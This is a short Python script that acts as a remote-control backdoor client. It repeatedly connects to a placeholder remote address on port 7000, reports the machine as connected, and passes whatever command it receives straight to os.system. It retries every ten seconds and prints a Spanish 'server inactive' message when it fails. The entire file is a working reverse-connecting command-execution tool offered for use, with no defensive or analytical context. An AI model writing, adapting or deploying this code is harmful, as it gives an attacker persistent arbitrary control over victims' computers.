import socket
import os
import time

while(True):
    try:
        mi_socket = socket.socket()
        mi_socket.connect(('xxx.xxx.xxx.xxx',7000)) #put the same ip address and port in client


        mi_socket.send(" 'Client Computer Name' has connected ".encode())
        respuesta = mi_socket.recv(1024).decode()

        os.system(respuesta)

        mi_socket.close()

        time.sleep(10)

    except:

        print("Servidor Inactivo")
        time.sleep(10)


